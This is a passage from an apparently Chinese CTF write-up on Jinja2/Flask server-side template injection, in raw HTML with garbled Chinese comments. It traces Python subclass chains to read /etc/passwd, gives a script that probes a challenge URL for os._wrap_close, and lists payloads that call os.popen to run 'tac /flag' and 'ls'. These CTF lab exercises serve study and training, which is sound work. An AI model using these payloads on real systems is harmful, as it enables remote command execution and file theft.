string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token comment"># Ëé∑ÂæóÁà∂Á±ª‰∏≠ÁöÑobjectÁ±ª</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token comment"># Ëé∑ÂæóobjectÁ±ªÁöÑÂ≠êÁ±ªÔºå‰ΩÜÂèëÁé∞Ëøô‰∏™__subclasses__Â±ûÊÄßÊòØ‰∏™ÊñπÊ≥ï</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> method __subclasses__ of <span class="token builtin">type</span> <span class="token builtin">object</span> at <span class="token number">0x10376d320</span><span class="token operator">></span><span class="token comment"># ‰ΩøÁî®__subclasses__()ÊñπÊ≥ïÔºåËé∑ÂæóobjectÁ±ªÁöÑÂ≠êÁ±ª</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'xrange'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'buffer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'long'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classobj'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dictproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instance'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'callable-iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.long_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.float_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.version_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.flags'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'exceptions.BaseException'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'imp.NullImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.stat_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.statvfs_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Hashable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Iterable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Sized'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Container'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Callable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Helper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Pattern'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Match'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token comment"># Ëé∑ÂæóÁ¨¨40‰∏™Â≠êÁ±ªÁöÑ‰∏Ä‰∏™ÂÆû‰æãÔºåÂç≥‰∏Ä‰∏™fileÂÆû‰æã</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token comment"># ÂØπfileÂàùÂßãÂåñ</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token builtin">open</span> <span class="token builtin">file</span> <span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> mode <span class="token string">'r'</span> at <span class="token number">0x10397a8a0</span><span class="token operator">></span><span class="token comment"># ‰ΩøÁî®fileÁöÑreadÂ±ûÊÄßËØªÂèñÔºå‰ΩÜÂèëÁé∞ÊòØ‰∏™ÊñπÊ≥ï</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> method read of <span class="token builtin">file</span> <span class="token builtin">object</span> at <span class="token number">0x10397a5d0</span><span class="token operator">></span><span class="token comment"># ‰ΩøÁî®read()ÊñπÊ≥ïËØªÂèñ</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>nobody<span class="token punctuation">:</span><span class="token operator">*</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span>Unprivileged User<span class="token punctuation">:</span><span class="token operator">/</span>var<span class="token operator">/</span>empty<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>falseroot<span class="token punctuation">:</span><span class="token operator">*</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span>System Administrator<span class="token punctuation">:</span><span class="token operator">/</span>var<span class="token operator">/</span>root<span class="token punctuation">:</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh</code></pre><p>Â∏∏Áî®ËøáÊª§Âô®</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÂ∞ÜÂÄºËΩ¨Êç¢‰∏∫<span class="token builtin">int</span>Á±ªÂûãÔºõ<span class="token builtin">float</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÂ∞ÜÂÄºËΩ¨Êç¢‰∏∫<span class="token builtin">float</span>Á±ªÂûãÔºõlower<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÂ∞ÜÂ≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫Â∞èÂÜôÔºõupper<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÂ∞ÜÂ≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫Â§ßÂÜôÔºõtitle<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÊääÂÄº‰∏≠ÁöÑÊØè‰∏™ÂçïËØçÁöÑÈ¶ñÂ≠óÊØçÈÉΩËΩ¨ÊàêÂ§ßÂÜôÔºõcapitalize<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÊääÂèòÈáèÂÄºÁöÑÈ¶ñÂ≠óÊØçËΩ¨ÊàêÂ§ßÂÜôÔºåÂÖ∂‰ΩôÂ≠óÊØçËΩ¨Â∞èÂÜôÔºõtrim<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÊà™ÂèñÂ≠óÁ¨¶‰∏≤ÂâçÈù¢ÂíåÂêéÈù¢ÁöÑÁ©∫ÁôΩÂ≠óÁ¨¶Ôºõwordcount<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöËÆ°ÁÆó‰∏Ä‰∏™ÈïøÂ≠óÁ¨¶‰∏≤‰∏≠ÂçïËØçÁöÑ‰∏™Êï∞Ôºõreverse<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÂ≠óÁ¨¶‰∏≤ÂèçËΩ¨Ôºõreplace<span class="token punctuation">(</span>value<span class="token punctuation">,</span>old<span class="token punctuation">,</span>new<span class="token punctuation">)</span>Ôºö ÊõøÊç¢Â∞ÜoldÊõøÊç¢‰∏∫newÁöÑÂ≠óÁ¨¶‰∏≤Ôºõtruncate<span class="token punctuation">(</span>value<span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span>killwords<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>ÔºöÊà™ÂèñlengthÈïøÂ∫¶ÁöÑÂ≠óÁ¨¶‰∏≤Ôºõstriptags<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÂà†Èô§Â≠óÁ¨¶‰∏≤‰∏≠ÊâÄÊúâÁöÑHTMLÊ†áÁ≠æÔºåÂ¶ÇÊûúÂá∫Áé∞Â§ö‰∏™Á©∫Ê†ºÔºåÂ∞ÜÊõøÊç¢Êàê‰∏Ä‰∏™Á©∫Ê†ºÔºõescape<span class="token punctuation">(</span><span class="token punctuation">)</span>ÊàñeÔºöËΩ¨‰πâÂ≠óÁ¨¶Ôºå‰ºöÂ∞Ü<span class="token operator">&lt;</span>„ÄÅ<span class="token operator">></span>Á≠âÁ¨¶Âè∑ËΩ¨‰πâÊàêHTML‰∏≠ÁöÑÁ¨¶Âè∑„ÄÇÊòæ‰æãÔºöcontent<span class="token operator">|</span>escapeÊàñcontent<span class="token operator">|</span>e„ÄÇsafe<span class="token punctuation">(</span><span class="token punctuation">)</span>Ôºö Á¶ÅÁî®HTMLËΩ¨‰πâÔºåÂ¶ÇÊûúÂºÄÂêØ‰∫ÜÂÖ®Â±ÄËΩ¨‰πâÔºåÈÇ£‰πàsafeËøáÊª§Âô®‰ºöÂ∞ÜÂèòÈáèÂÖ≥ÊéâËΩ¨‰πâ„ÄÇÁ§∫‰æãÔºö <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">'&lt;em>hello&lt;/em>'</span><span class="token operator">|</span>safe<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Ôºõ<span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÂ∞ÜÂèòÈáèÂàóÊàêÂàóË°®Ôºõstring<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÂ∞ÜÂèòÈáèËΩ¨Êç¢ÊàêÂ≠óÁ¨¶‰∏≤Ôºõjoin<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöÂ∞Ü‰∏Ä‰∏™Â∫èÂàó‰∏≠ÁöÑÂèÇÊï∞ÂÄºÊãºÊé•ÊàêÂ≠óÁ¨¶‰∏≤„ÄÇÁ§∫‰æãÁúã‰∏äÈù¢payloadÔºõ<span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöËøîÂõû‰∏Ä‰∏™Êï∞ÂÄºÁöÑÁªùÂØπÂÄºÔºõfirst<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöËøîÂõû‰∏Ä‰∏™Â∫èÂàóÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†Ôºõlast<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöËøîÂõû‰∏Ä‰∏™Â∫èÂàóÁöÑÊúÄÂêé‰∏Ä‰∏™ÂÖÉÁ¥†Ôºõ<span class="token builtin">format</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>arags<span class="token punctuation">,</span><span class="token operator">*</span>kwargs<span class="token punctuation">)</span>ÔºöÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤„ÄÇÊØîÂ¶ÇÔºö<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token string">"%s"</span> <span class="token operator">-</span> <span class="token string">"%s"</span><span class="token operator">|</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'Hello?'</span><span class="token punctuation">,</span><span class="token string">"Foo!"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Â∞ÜËæìÂá∫ÔºöHelloo? <span class="token operator">-</span> Foo!length<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöËøîÂõû‰∏Ä‰∏™Â∫èÂàóÊàñËÄÖÂ≠óÂÖ∏ÁöÑÈïøÂ∫¶Ôºõ<span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöËøîÂõûÂàóË°®ÂÜÖÊï∞ÂÄºÁöÑÂíåÔºõsort<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºöËøîÂõûÊéíÂ∫èÂêéÁöÑÂàóË°®Ôºõdefault<span class="token punctuation">(</span>value<span class="token punctuation">,</span>default_value<span class="token punctuation">,</span>boolean<span class="token operator">=</span>false<span class="token punctuation">)</span>ÔºöÂ¶ÇÊûúÂΩìÂâçÂèòÈáèÊ≤°ÊúâÂÄºÔºåÂàô‰ºö‰ΩøÁî®ÂèÇÊï∞‰∏≠ÁöÑÂÄºÊù•‰ª£Êõø„ÄÇÁ§∫‰æãÔºöname<span class="token operator">|</span>default<span class="token punctuation">(</span><span class="token string">'xiaotuo'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Â¶ÇÊûúname‰∏çÂ≠òÂú®ÔºåÂàô‰ºö‰ΩøÁî®xiaotuoÊù•Êõø‰ª£„ÄÇboolean<span class="token operator">=</span><span class="token boolean">False</span>ÈªòËÆ§ÊòØÂú®Âè™ÊúâËøô‰∏™ÂèòÈáè‰∏∫undefinedÁöÑÊó∂ÂÄôÊâç‰ºö‰ΩøÁî®default‰∏≠ÁöÑÂÄºÔºåÂ¶ÇÊûúÊÉ≥‰ΩøÁî®pythonÁöÑÂΩ¢ÂºèÂà§Êñ≠ÊòØÂê¶‰∏∫falseÔºåÂàôÂèØ‰ª•‰º†ÈÄíboolean<span class="token operator">=</span>true„ÄÇ‰πüÂèØ‰ª•‰ΩøÁî®<span class="token keyword">or</span>Êù•ÊõøÊç¢„ÄÇlength<span class="token punctuation">(</span><span class="token punctuation">)</span>ËøîÂõûÂ≠óÁ¨¶‰∏≤ÁöÑÈïøÂ∫¶ÔºåÂà´ÂêçÊòØcount</code></pre><p><a href="https://www.freebuf.com/articles/web/328222.html">CTF ÂØπSSTIÁöÑ‰∏Ä‰∫õÊÄªÁªì</a></p><h3 id="web361-372"><a href="#web361-372" class="headerlink" title="web361-372"></a>web361-372</h3><h4 id="web361-os-wrap-close"><a href="#web361-os-wrap-close" class="headerlink" title="web361(os._wrap_close)"></a>web361(os._wrap_close)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span>__class__<span class="token operator">.</span>__base__<span class="token operator">.</span><span class="token function">__subclasses__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="web361.png" loading="lazy"></p><p>‰πüÂèØ‰ª•‰ΩøÁî®ËÑöÊú¨Êü•Êâæ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'https://589fbc1b-7f84-4f77-97bc-d20ad9e2b2b9.challenge.ctf.show/?name=&#123;&#123;%22%22.__class__.__bases__[0].__subclasses__()['</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">']&#125;&#125;'</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'os._wrap_close'</span> <span class="token keyword">in</span> r<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>ÁÑ∂ÂêéÂà©Áî®<strong>os._wrap_close</strong>Á±ª<strong>init.globals</strong>Êù•ÊâæosÁ±ª‰∏≠ÁöÑ„ÄÇinitÂàùÂßãÂåñÔºåglobalsÂÖ®Â±ÄÊü•Êâæ</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span>__class__<span class="token operator">.</span>__base__<span class="token operator">.</span><span class="token function">__subclasses__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'os'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac ../flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token operator">.</span>os<span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token operator">.</span>__class__<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'os'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web362-Êï∞Â≠óÁªïËøá-half2full"><a href="#web362-Êï∞Â≠óÁªïËøá-half2full" class="headerlink" title="web362(Êï∞Â≠óÁªïËøá half2full)"></a>web362(Êï∞Â≠óÁªïËøá 